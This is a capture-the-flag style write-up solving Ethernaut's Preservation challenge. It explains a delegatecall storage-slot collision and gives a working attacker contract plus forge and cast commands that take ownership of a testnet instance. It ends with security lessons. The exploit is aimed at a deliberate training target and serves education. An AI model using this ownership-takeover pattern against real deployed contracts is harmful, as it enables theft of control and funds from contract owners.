# Ethernaut Challenge 16 — Preservation

This challenge demonstrates how unsafe `delegatecall` can be when a contract relies on external library addresses and the storage layouts are compatible in the wrong way.

The goal is to become the `owner` of the `Preservation` instance.

Instance address:

```bash
0x97e653C5A8CDF2ED240724974F6462199a87AB0B
````

---

## 🎯 Goal

Take ownership of the `Preservation` contract.

---

## 🧠 Understanding the challenge

The contract stores two library addresses and uses `delegatecall` to execute their `setTime()` function.

A simplified version of the storage layout is:

```solidity
address public timeZone1Library; // slot 0
address public timeZone2Library; // slot 1
address public owner;            // slot 2
uint256 storedTime;              // slot 3
```

The library contract has this layout:

```solidity
contract LibraryContract {
    uint256 storedTime; // slot 0

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}
```

The key issue is that `delegatecall` executes the library code **in the storage context of the caller**.

So when `Preservation` delegatecalls `LibraryContract.setTime(uint256)`, this line:

```solidity
storedTime = _time;
```

does **not** write to the library storage.

Instead, it writes to slot `0` of `Preservation`, which is:

```solidity
timeZone1Library
```

That means we can overwrite the `timeZone1Library` address by calling:

```solidity
setFirstTime(uint256(uint160(address(attacker))))
```

After that, the next call to `setFirstTime()` will delegatecall into our attacker contract instead of the original library.

If our attacker contract has the same storage layout for the first three slots:

```solidity
address public timeZone1Library;
address public timeZone2Library;
address public owner;
```

then its `setTime()` function can overwrite slot `2`, which corresponds to `owner` in `Preservation`.

👉 So the exploit is:

1. overwrite `timeZone1Library` with the attacker contract address
2. call `setFirstTime()` again
3. execute attacker logic through `delegatecall`
4. set `owner = msg.sender`

---

## 🧪 Attacker contract
I have written the test `PreservationTest.t.sol` to test the exploit locally using the `PreservationAttacker`.

👉 Implementation: [PreservationAttacker.sol](PreservationAttacker.sol)

👉 Test: [PreservationTest.t.sol](../../test/challenge-16-preservation/PreservationTest.t.sol)


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract PreservationAttacker {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256 /* _time */) public {
        owner = msg.sender;
    }
}
```

This contract is designed so that its storage layout matches the first three slots of `Preservation`.

When `Preservation` delegatecalls `setTime()`, the assignment:

```solidity
owner = msg.sender;
```

actually writes into the `owner` slot of the `Preservation` contract.

---

## 🧪 Run tests

```bash
forge test --mc PreservationTest
```

---

## 🚀 Execute on Sepolia

Set the instance address:

```bash
PRESERVATION_SEPOLIA=0x97e653C5A8CDF2ED240724974F6462199a87AB0B
```

Deploy the attacker contract:

```bash
forge create src/challenge-16-preservation/PreservationAttacker.sol:PreservationAttacker \
  --rpc-url $SEPOLIA_RPC_URL \
  --account ethernaut \
  --broadcast
```

Deployed attacker:

```bash
0x3acEc3Ff67B6dd4e5F488EC8B6Da33C1A1FA7eE0
```

Save it:

```bash
PRESERVATION_ATTACKER_SEPOLIA=0x3acEc3Ff67B6dd4e5F488EC8B6Da33C1A1FA7eE0
```

---

## ✅ Step 1 — Overwrite `timeZone1Library`

Call `setFirstTime(uint256)` and pass the numeric value of the attacker address.

```bash
cast send $PRESERVATION_SEPOLIA \
  "setFirstTime(uint256)" $(cast --to-dec $PRESERVATION_ATTACKER_SEPOLIA) \
  --rpc-url $SEPOLIA_RPC_URL \
  --account ethernaut
```

Transaction hash:

```bash
0xaf5f093d2960fc016426c030ad687d9cc45e454d41259d6dfa93c95644affc4c
```

Verify that `timeZone1Library` now points to the attacker contract:

```bash
cast call $PRESERVATION_SEPOLIA \
    "timeZone1Library()" \
    --rpc-url $SEPOLIA_RPC_URL
```

Result:

```bash
0x0000000000000000000000003acec3ff67b6dd4e5f488ec8b6da33c1a1fa7ee0
```

The library address was successfully replaced.

---

## ✅ Step 2 — Take ownership

Now call `setFirstTime()` again:

```bash
cast send $PRESERVATION_SEPOLIA \
  "setFirstTime(uint256)" 0 \
  --rpc-url $SEPOLIA_RPC_URL \
  --account ethernaut
```

Transaction hash:

```bash
0x34495d1aa5d9d102784dcb32d1b74c18efab28883d18b9dda453bae1887252c5
```

At this point, `delegatecall` executes the attacker's `setTime()` function, which sets:

```solidity
owner = msg.sender;
```

Since the transaction is sent from my account, ownership is transferred to my address.

---

## ✅ Step 3 — Verify the result

Check the owner:

```bash
cast call $PRESERVATION_SEPOLIA \
    "owner()" \
    --rpc-url $SEPOLIA_RPC_URL
```

Result:

```bash
0x000000000000000000000000ecf94300dd67bb8c31f41be3a2136d3f0abfb0b0
```

The owner is now my address.

Challenge solved ✅

---

## 🛡️ Security takeaway

This challenge shows why `delegatecall` must be used with extreme care.

Key lessons:

* `delegatecall` executes code in the caller's storage context
* storage layout mismatches can let an external contract overwrite critical state
* if library addresses can be corrupted, an attacker can redirect execution to malicious code
* ownership and other privileged variables can be taken over if they share storage slots with delegated logic

When using `delegatecall`, both the target contract and the caller must be designed with storage safety in mind.

